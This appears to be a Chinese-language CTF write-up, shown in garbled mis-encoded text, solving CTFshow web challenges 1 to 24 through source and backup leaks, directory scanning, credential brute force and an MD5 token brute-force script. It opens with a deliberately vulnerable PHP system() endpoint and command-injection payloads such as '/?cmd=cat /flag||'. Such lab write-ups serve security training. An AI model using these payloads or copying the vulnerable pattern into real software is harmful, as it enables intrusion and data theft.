å¤§å¤šæ•° UNIX ç³»ç»Ÿå‘½ä»¤ä»ä½ çš„ç»ˆç«¯æ¥å—è¾“å…¥å¹¶å°†æ‰€äº§ç”Ÿçš„è¾“å‡ºå‘é€å›â€‹â€‹åˆ°æ‚¨çš„ç»ˆç«¯ã€‚ä¸€ä¸ªå‘½ä»¤é€šå¸¸ä»ä¸€ä¸ªå«æ ‡å‡†è¾“å…¥çš„åœ°æ–¹è¯»å–è¾“å…¥ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™æ°å¥½æ˜¯ä½ çš„ç»ˆç«¯ã€‚åŒæ ·ï¼Œä¸€ä¸ªå‘½ä»¤é€šå¸¸å°†å…¶è¾“å‡ºå†™å…¥åˆ°æ ‡å‡†è¾“å‡ºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¹Ÿæ˜¯ä½ çš„ç»ˆç«¯ â€”â€” è¿™äº›æ˜¯å‘½ä»¤æœ‰å›æ˜¾çš„åŸºç¡€ã€‚

å¦‚æœå¸Œæœ›æ‰§è¡ŒæŸä¸ªå‘½ä»¤ï¼Œä½†åˆä¸å¸Œæœ›åœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œé‚£ä¹ˆå¯ä»¥å°†è¾“å‡ºé‡å®šå‘åˆ° /dev/nullï¼š
$ command > /dev/null

/dev/null æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå†™å…¥åˆ°å®ƒçš„å†…å®¹éƒ½ä¼šè¢«ä¸¢å¼ƒï¼›å¦‚æœå°è¯•ä»è¯¥æ–‡ä»¶è¯»å–å†…å®¹ï¼Œé‚£ä¹ˆä»€ä¹ˆä¹Ÿè¯»ä¸åˆ°ã€‚ä½†æ˜¯ /dev/null æ–‡ä»¶éå¸¸æœ‰ç”¨ï¼Œå°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°å®ƒï¼Œä¼šèµ·åˆ°"ç¦æ­¢è¾“å‡º"çš„æ•ˆæœã€‚
å¦‚æœå¸Œæœ›å±è”½ stdout å’Œ stderrï¼Œå¯ä»¥è¿™æ ·å†™ï¼š
$ command > /dev/null 2>&1

*/

function hello_shell($cmd){
    /*>/dev/null å°†ä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œä½†ä¼šå›æ˜¾é”™è¯¯ï¼ŒåŠ ä¸Š 2>&1 åè¿é”™è¯¯ä¹Ÿä¼šè¢«å±è”½æ‰*/
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>

```

> ä½¿ç”¨  ï¼› åˆ†å‰²å‘½ä»¤
>
> æˆ–è€…ä½¿ç”¨ || é€»è¾‘ç¬¦çŸ­è·¯åé¢çš„å‘½ä»¤
>

```php
/?cmd=ls /||
/?cmd=cat /flag||
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1737290597153-ae60da10-635c-46d0-9ff4-69483bc169b1.png)

# CTFshow

## web1

> hintï¼šå¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401477801-7344cc3c-f6e0-4f2c-a86c-332d60b1e768.png)

## web2

> hintï¼šjså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401579382-35edb958-a49d-4b4e-957b-3e1f584b0065.png)

ç¦ç”¨äº† F12 å’Œ å³é”®

**è§£å†³åŠæ³•**

> 1ã€ctrl+u çœ‹æºç 
>
> 2ã€url å‰é¢åŠ ä¸Š view-source: çœ‹æºç 
>
> 3ã€ctrl+shift+i æ‰“å¼€å¼€å‘è€…å·¥å…·
>
> 4ã€åœ¨æµè§ˆå™¨è®¾ç½®ï¼Œæ›´å¤šå·¥å…·ä¸­æ‰¾åˆ°å¼€å‘è€…å·¥å…·

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401727430-a4c6a26b-f5d2-43ac-9553-8dbf4722d01b.png)

## web3

**æç¤ºï¼š**

> hintï¼šæ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·

çœ‹çœ‹è¯·æ±‚å¤´

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736401876752-47d83c7c-ad94-4234-8f15-0285a05d651d.png)

## web4

> hintï¼šæ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402011129-870b2da4-0623-4510-9dad-19963c34378d.png)

è·³è½¬![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402033387-93df624f-827e-4098-9338-85af69547b15.png)

## web5

> hintï¼šphpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™

url ååŠ ä¸Š /index.phps ï¼Œä¼šä¸‹è½½æ–‡ä»¶ã€‚

æ‰“å¼€å¦‚ä¸‹![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402302167-267ef2e7-0e29-462f-97d8-cc77f08989bc.png)

### æ€»ç»“

`phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚å…¶å®ï¼Œåªè¦ä¸ç”¨phpç­‰å·²ç»åœ¨æœåŠ¡å™¨ä¸­æ³¨å†Œè¿‡çš„MIMEç±»å‹ä¸ºæ–‡ä»¶å³å¯ï¼Œä½†ä¸ºäº†å›½é™…é€šç”¨ï¼Œæ‰€ä»¥æ‰ç”¨äº†phpsæ–‡ä»¶ç±»å‹ã€‚`

## web6

> hintï¼šè§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥

çŒœæµ‹åå°æœ‰å‹ç¼©åŒ…ï¼Œä½¿ç”¨ dirsearch æ‰«ç›®å½•

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402771123-b347c01f-a28f-4ae6-a1a4-72814288864c.png)

è·³è½¬å¹¶è§£å‹ç¼©

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402817049-d5846601-c9e3-4b36-b5ca-aadf69ac4093.png)

æ‰“å¼€

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736402806570-05c22860-3f27-4fba-b957-6ce2511bddaf.png)

## web7

> hint:ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚

çŒœæµ‹ä¸º git æ³„éœ²ï¼Œæ‰«ç›®å½•

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403063896-b7abd4e5-0b54-402d-98f6-f027c31db328.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403052612-eeb414fd-1b34-4856-9d5d-0a463e77479c.png)

## web8

> hintï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚

æ¥ç€æ‰«

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403219381-11284f28-f6a6-4644-a6a2-da4a359e82fc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403205961-30eb5cf4-13aa-4f8a-8eb1-337d689cd2e9.png)

## web9

> hintï¼šå‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†

url ååŠ ä¸Š /index.php.swp ä¼šä¸‹è½½æ–‡ä»¶

æ‰“å¼€æ–‡ä»¶

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403452308-6790146f-3fd2-461f-b9ff-097de7fc79a5.png)

### æ€»ç»“

 **å…³äºswpæ–‡ä»¶ **

 ä½¿ç”¨viï¼Œç»å¸¸å¯ä»¥çœ‹åˆ°swpè¿™ä¸ªæ–‡ä»¶,é‚£è¿™ä¸ªæ–‡ä»¶æ˜¯æ€ä¹ˆäº§ç”Ÿçš„å‘¢ï¼Œå½“ä½ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œviå°±ä¼šç”Ÿæˆè¿™ä¹ˆä¸€ä¸ª.(filename)swpæ–‡ä»¶ ä»¥å¤‡ä¸æµ‹ï¼ˆä¸æµ‹ä¸‹é¢è®¨è®ºï¼‰ï¼Œå¦‚æœä½ æ­£å¸¸é€€å‡ºï¼Œé‚£ä¹ˆè¿™ä¸ªè¿™ä¸ªswpæ–‡ä»¶å°†ä¼šè‡ªåŠ¨åˆ é™¤ ã€‚

ä¸‹é¢è¯´ä¸è‡ªåŠ¨åˆ é™¤çš„æƒ…å†µã€‚ 

+ 1ã€å½“ä½ ç”¨å¤šä¸ªç¨‹åºç¼–è¾‘åŒä¸€ä¸ªæ–‡ä»¶æ—¶ã€‚ 
+ 2ã€éå¸¸è§„é€€å‡ºæ—¶ã€‚

å¯ä»¥åœ¨ linux é‡Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¢å¤ swp æ–‡ä»¶

```javascript
vi -r æ–‡ä»¶è·¯å¾„
```

## web10

> hintï¼šcookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736403546283-e573d451-2243-4b62-8267-91dd77628a50.png)

url è§£ç ä¸€ä¸‹

```plain
ctfshow{c3e9d906-4bfd-48c5-8d3c-ea45ad1e3970}
```

## web11

> hintï¼šåŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯â€˜

å¯¹åŸŸåè¿›è¡Œ DNS è§£æ

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404201406-0209b1e3-0dad-4a14-a114-db405c04d84e.png)

## web12

> hintï¼š æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç 

å¯ç–‘ä¿¡æ¯

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404457448-832ef382-726d-4ff0-abc9-1612660ff69a.png)

è¿›å…¥ /robots.txt

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404523880-f8d01b36-652e-4303-9620-66aac926e638.png)

å¾—åˆ°è´¦å·å¯†ç 

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404597475-9ad05462-fed9-4845-b73c-cdf172872d20.png)

## web13

> hintï¼šæŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç 

å¯»æ‰¾æŠ€æœ¯æ–‡æ¡£

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404775352-b01bd995-6dc2-410a-8143-5b3d802e8e7e.png)

ç‚¹å‡»åä¼šä¸‹è½½ pdf æ–‡ä»¶ï¼Œæ‰“å¼€

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404803179-e15e34ce-7868-4773-9d37-5694b9b26c0a.png)

url ååŠ å…¥ /system1103/login.php ç™»å½•

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736404935720-0a9d6b64-4fc5-4dbf-b0b5-b7835c870098.png)

## web14

> hintï¼šæœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº

ctrl+u æŸ¥çœ‹æºç ï¼Œæœç´¢ editor

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736412944535-2d55e356-fc75-4132-aaec-f2ce9954e447.png)

å‘ç°è¿™ä¸ªï¼Œå°è¯•è¿›å…¥![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736413112488-b33a7904-5105-4465-b226-d15d8437a0fc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736413133810-bbde872c-f38c-47d3-a3f5-60a83faf5ad7.png)

åœ¨ var/www/html/nothinghere é‡Œæ‰¾åˆ° fl000g.txt  æ–‡ä»¶

 å› æ­¤æˆ‘ä»¬éœ€è¦è®¿é—®URL/nothinghere/fl000g.txtå³å¯

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420196300-92ddbb3d-33ff-4a4c-b375-8b2e303fc1fd.png)

## web15

> hintï¼šå…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420485084-dbacb9dc-09b7-4d0e-b250-6a2bf60ff8d3.png)

æ‰«åå°

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420917268-17dad810-36b6-4534-bddb-5610676d0ff6.png)

è¿›å…¥ /adminï¼Œé€‰å¿˜è®°å¯†ç 

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736420800809-edffe937-bfe7-465c-b2f5-bc183e51761c.png)

æœç´¢é‚®ç®±ä¸­çš„ qq å·ï¼Œå‘ç°åœ¨è¥¿å®‰ã€‚é‡ç½®å¯†ç ä¹‹åçŒœæµ‹ç”¨æˆ·åä¸º admin

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421015182-252ec992-07b0-4890-ac27-fdafa234b1a2.png)

## web16

> hintï¼šå¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²

æ‰«ç›®å½•å•¥ä¹Ÿæ²¡æ‰«å‡ºæ¥ï¼ŒæŸ¥èµ„æ–™è¦ç”¨ tz.php

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421432765-53548d61-7719-4c3d-ba3c-2998fc07c843.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421461978-ff609bea-6510-4bb0-a92e-7356557eb348.png)

## web17

> hintï¼š å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯

æ‰«åå°

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421601436-ed608360-4f22-4a2c-892d-b1597ea360dc.png)

ä¸‹è½½åæ‰“å¼€

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736421663176-ff421253-0cd9-4634-8656-0129025376f3.png)

## web18

> hintï¼šä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag

æ¸¸æˆé¢˜ï¼ŒæŸ¥æ‰¾å…³é”®ä»£ç 

```plain
if(game_over==false)
{
requestAnimationFrame(run);
}else
{
if(score>100)
{
var result=window.confirm("\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b");
}
else
{
var result=window.confirm("GAMEOVER\næ˜¯å¦ä»æ–°å¼€å§‹");
if(result){
location.reload();}
}
```

ä»¤ game_over = false ä¸” score > 100 æ‰è¡Œ

æ§åˆ¶å°è¾“å…¥

```plain
game_over=false;score=200;run();
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422231071-0226b4db-d9c6-4780-bad6-14af211126ec.png)

è¿›å…¥ 110.php

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422267793-2b9b545f-465b-4cd8-8b61-7cb340b2f9ba.png)

## web19

> hintï¼šå¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†

æŸ¥çœ‹æºç 

```javascript
<script type="text/javascript">
  function checkForm(){
    var key = "0000000372619038";
    var iv = "ilove36dverymuch";
    var pazzword = $("#pazzword").val();
    pazzword = encrypt(pazzword,key,iv);
    $("#pazzword").val(pazzword);
    $("#loginForm").submit();

  }
function encrypt(data,key,iv) { //key,ivï¼š16ä½çš„å­—ç¬¦ä¸²
  var key1  = CryptoJS.enc.Latin1.parse(key);
  var iv1   = CryptoJS.enc.Latin1.parse(iv);
  return CryptoJS.AES.encrypt(data, key1,{
    iv : iv1,
    mode : CryptoJS.mode.CBC,
    padding : CryptoJS.pad.ZeroPadding
  }).toString();
}

</script>
  <!--
  error_reporting(0);
$flag="fakeflag"
$u = $_POST['username'];
$p = $_POST['pazzword'];
if(isset($u) && isset($p)){
  if($u==='admin' && $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){
    echo $flag;
  }
}
-->
```

AES åŠ å¯†

> modeæ¨¡å¼ï¼š CBC paddingå¡«å……æ–¹å¼ï¼š ZeroPadding  
> å¯†æ–‡è¾“å‡ºç¼–ç ï¼š åå…­è¿›åˆ¶hex åç§»é‡iv: ilove36dverymuch å¯†é’¥ï¼š0000000372619038  
> å¯†æ–‡ä¸ºï¼š a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04  

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422728722-d9468331-c8ac-4116-95d1-ece18376eac1.png)

å¾—åˆ°å¯†ç ä¸º `i_want_a_36d_girl`

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736422761287-875abd05-f4f9-4fa9-bc7a-30ab9c9e5d1c.png)

## web20

> hintï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚

ä½¿ç”¨ dirsearch é€’å½’æ‰«æ

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736423254122-f21844bb-4cfa-4e2f-961a-56321387252d.png)

ä¸‹è½½åæœç´¢ flag

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736423392705-a6735ff2-d9cc-49fd-8740-6c4cbae9c2e6.png)

## web21

> hintï¼šçˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“

éšä¾¿è¾“å…¥ä¸€ä¸‹ï¼Œç›´æ¥æŠ“åŒ…

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507195608-172dac8b-4a98-442b-a391-16f4207d5526.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507321534-12ddbd51-e2ac-4c5b-ae07-c4c4a2bf4566.png)

è§£ç åçœ‹åˆ°æ˜¯ è´¦æˆ·ï¼šå¯†ç  çš„å½¢å¼

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507268169-b3d7b270-d53e-4504-b3f2-493ca4c85285.png)

ä½¿ç”¨ç»™çš„å­—å…¸è¿›è¡Œçˆ†ç ´

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507740662-f00438ea-ae43-43da-bd52-a4bb3384587e.png)

å¾—åˆ°ç»“æœ

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507779374-88020189-f876-4f2d-82ff-f184d697b527.png)

## web22

> hintï¼šåŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå

å¯¹åŸŸåè¿›è¡Œçˆ†ç ´ï¼Œå…ˆè®¿é—®ä¸€ä¸‹çœ‹çœ‹

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736507940784-d39dc291-7c25-46fc-ac67-6621b6b0d54c.png)

 è®¿é—®åˆ°vip.ctf.showæ—¶ï¼Œå‘ç°flag  

## web23

> hintï¼šè¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼

```php
<?php

  /*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
* ä¸Šè¿°éƒ¨åˆ†æ˜¯ä»£ç çš„å¤´éƒ¨ä¿¡æ¯ï¼ŒåŒ…å«äº†ç¼–ç æ ¼å¼å£°æ˜ã€ä½œè€…ã€æ—¥æœŸã€ä¿®æ”¹ä¿¡æ¯ä»¥åŠè”ç³»æ–¹å¼ç­‰ç›¸å…³è¯´æ˜ï¼Œä½†é€šå¸¸å’Œå…·ä½“ä»£ç é€»è¾‘æ‰§è¡Œå…³è”ä¸å¤§ã€‚
*/

  // å…³é—­ PHP çš„é”™è¯¯æŠ¥å‘Šï¼Œè¿™æ ·åœ¨ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¸ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯åˆ°é¡µé¢ç­‰è¾“å‡ºä½ç½®
  error_reporting(0); 

// å¼•å…¥åä¸º 'flag.php' çš„æ–‡ä»¶ï¼Œé€šå¸¸è¿™é‡Œé¢å¯èƒ½åŒ…å«äº†è¦è¾“å‡ºçš„å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚é¢˜ç›®ä¸­çš„ 'flag'ï¼‰ï¼Œä½†ä»£ç ä¸­æœªå±•ç¤ºå…¶å…·ä½“å†…å®¹
include('flag.php'); 

// åˆ¤æ–­æ˜¯å¦é€šè¿‡ GET æ–¹å¼ä¼ é€’äº†åä¸º 'token' çš„å‚æ•°
if (isset($_GET['token'])) { 
  // å¦‚æœä¼ é€’äº† 'token' å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œ MD5 åŠ å¯†å¤„ç†ï¼Œå°†åŠ å¯†åçš„ç»“æœèµ‹å€¼ç»™ $token å˜é‡
  $token = md5($_GET['token']); 
  // ä»¥ä¸‹æ˜¯ä¸€ç³»åˆ—çš„æ¡ä»¶åˆ¤æ–­ï¼Œç”¨äºéªŒè¯ $token åŠ å¯†åå­—ç¬¦ä¸²çš„ç‰¹å®šä½ç½®å­—ç¬¦æ˜¯å¦æ»¡è¶³ä¸€å®šå…³ç³»
  if (substr($token, 1, 1) === substr($token, 14, 1) && substr($token, 14, 1) === substr($token, 17, 1)) {
    // è¿™é‡Œè¿›ä¸€æ­¥éªŒè¯é€šè¿‡æˆªå– $token å­—ç¬¦ä¸²ç‰¹å®šä½ç½®å­—ç¬¦è½¬æ¢ä¸ºæ•´æ•°åè¿›è¡Œæ•°å­¦è¿ç®—çš„ç»“æœæ˜¯å¦æ»¡è¶³ç‰¹å®šæ¡ä»¶
    // å…ˆå°†æˆªå–åˆ°çš„å­—ç¬¦è½¬æ¢ä¸ºæ•´æ•°ï¼Œè¿›è¡ŒåŠ æ³•è¿ç®—åé™¤ä»¥ç¬¬ä¸€ä¸ªæˆªå–çš„å­—ç¬¦ï¼Œåˆ¤æ–­ç»“æœæ˜¯å¦ç­‰äºå¦ä¸€ä¸ªæˆªå–ä½ç½®å­—ç¬¦è½¬æ¢åçš„æ•´æ•°
    if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {
      // å¦‚æœä¸Šè¿°æ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³ï¼Œå°±è¾“å‡º $flag å˜é‡çš„å€¼ï¼Œè¿™é‡Œçš„ $flag åº”è¯¥æ˜¯ä»ä¹‹å‰å¼•å…¥çš„ 'flag.php' æ–‡ä»¶ä¸­è·å–åˆ°çš„å…³é”®ä¿¡æ¯
      echo $flag; 
    }
  }
} else {
  // å¦‚æœæ²¡æœ‰é€šè¿‡ GET æ–¹å¼ä¼ é€’ 'token' å‚æ•°ï¼Œå°±ä½¿ç”¨ highlight_file å‡½æ•°è¾“å‡ºå½“å‰ PHP æ–‡ä»¶çš„æºä»£ç å†…å®¹ï¼Œæ–¹ä¾¿æŸ¥çœ‹ä»£ç é€»è¾‘ç­‰æƒ…å†µ
  highlight_file(__FILE__);
}

?>
```

å†™è„šæœ¬

```python
import hashlib

# å®šä¹‰è¦éªŒè¯çš„æ¡ä»¶å‡½æ•°
def check_token(token_md5):
    if len(token_md5) < 32:
        return False
    first_char = token_md5[1:2]
    fourteenth_char = token_md5[14:15]
    seventeenth_char = token_md5[17:18]
    thirty_first_char = token_md5[31:32]
    if first_char == fourteenth_char and fourteenth_char == seventeenth_char:
        try:
            first_int = int(first_char, 16)
            # æ·»åŠ åˆ¤æ–­ï¼Œå¦‚æœfirst_intä¸º0ï¼Œç›´æ¥è¿”å›Falseï¼Œé¿å…å‡ºç°é™¤æ•°ä¸º0çš„é”™è¯¯
            if first_int == 0:
                return False
            sum_value = first_int + int(fourteenth_char, 16) + int(seventeenth_char, 16)
            result = sum_value / first_int
            thirty_first_int = int(thirty_first_char, 16)
            return result == thirty_first_int
        except ValueError:
            return False
    return False

# ç®€å•çš„å¾ªç¯å°è¯•ä¸åŒçš„tokenå€¼ï¼ˆè¿™é‡Œç¤ºä¾‹åªæ˜¯ç®€å•ä»æ•°å­—å¼€å§‹å°è¯•ï¼Œå¯ä»¥æ ¹æ®å®é™…æƒ…å†µæ‰©å±•èŒƒå›´ç­‰ï¼‰
for i in range(100000):
    token = str(i)
    token_md5 = hashlib.md5(token.encode()).hexdigest()
    if check_token(token_md5):
        print(f"å¯èƒ½çš„tokenå€¼: {token}")

```

ç»“æœå¦‚ä¸‹

```plain
å¯èƒ½çš„tokenå€¼: 422
å¯èƒ½çš„tokenå€¼: 1202
å¯èƒ½çš„tokenå€¼: 13702
å¯èƒ½çš„tokenå€¼: 15456
å¯èƒ½çš„tokenå€¼: 20770
å¯èƒ½çš„tokenå€¼: 22877
å¯èƒ½çš„tokenå€¼: 46617
å¯èƒ½çš„tokenå€¼: 48969
å¯èƒ½çš„tokenå€¼: 49255
å¯èƒ½çš„tokenå€¼: 54388
å¯èƒ½çš„tokenå€¼: 54674
å¯èƒ½çš„tokenå€¼: 59384
å¯èƒ½çš„tokenå€¼: 63281
å¯èƒ½çš„tokenå€¼: 64413
å¯èƒ½çš„tokenå€¼: 66039
å¯èƒ½çš„tokenå€¼: 66478
å¯èƒ½çš„tokenå€¼: 82614
å¯èƒ½çš„tokenå€¼: 88310
å¯èƒ½çš„tokenå€¼: 93326
```

è¾“å…¥å¾— flag

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736488545009-78714aca-8c79-41d7-b809-6228bfb06821.png)

## web24

> hintï¼šçˆ†ä¸ªğŸ”¨

```php
<?php

  /*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

* ä¸Šè¿°éƒ¨åˆ†æ˜¯ä»£ç å¼€å¤´çš„æ³¨é‡Šä¿¡æ¯ï¼ŒåŒ…å«äº†ç¼–ç æ ¼å¼å£°æ˜ã€ä½œè€…ã€æ—¥æœŸã€ä¿®æ”¹æ—¶é—´ä»¥åŠä½œè€…çš„é‚®ç®±å’Œç›¸å…³é“¾æ¥ç­‰å†…å®¹ï¼Œå±äºä»£ç çš„å…ƒä¿¡æ¯æè¿°ï¼Œå’Œæ ¸å¿ƒé€»è¾‘æ‰§è¡Œå…³è”æ€§ä¸å¤§ã€‚
*/

  // å…³é—­PHPçš„é”™è¯¯æŠ¥å‘ŠåŠŸèƒ½ï¼Œæ„å‘³ç€ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­å³ä½¿å‡ºç°é”™è¯¯ï¼Œä¹Ÿä¸ä¼šä¸»åŠ¨å‘é¡µé¢ç­‰è¾“å‡ºä½ç½®æ˜¾ç¤ºé”™è¯¯æç¤ºä¿¡æ¯ã€‚
  error_reporting(0); 

// å¼•å…¥åä¸º "flag.php" çš„æ–‡ä»¶ï¼Œé€šå¸¸æ¨æµ‹è¿™ä¸ªæ–‡ä»¶é‡Œå¯èƒ½å®šä¹‰äº†å…³é”®çš„å˜é‡ï¼ˆæ¯”å¦‚å¯èƒ½å­˜å‚¨ç€è¦è¾“å‡ºçš„ç±»ä¼¼ "flag" è¿™æ ·çš„å…³é”®ä¿¡æ¯ï¼‰ï¼Œä¸è¿‡è¿™é‡Œæ²¡æœ‰å±•ç¤º "flag.php" çš„å…·ä½“å†…å®¹ã€‚
include("flag.php"); 

// åˆ¤æ–­æ˜¯å¦é€šè¿‡GETæ–¹å¼ä¼ é€’äº†åä¸º "r" çš„å‚æ•°ã€‚
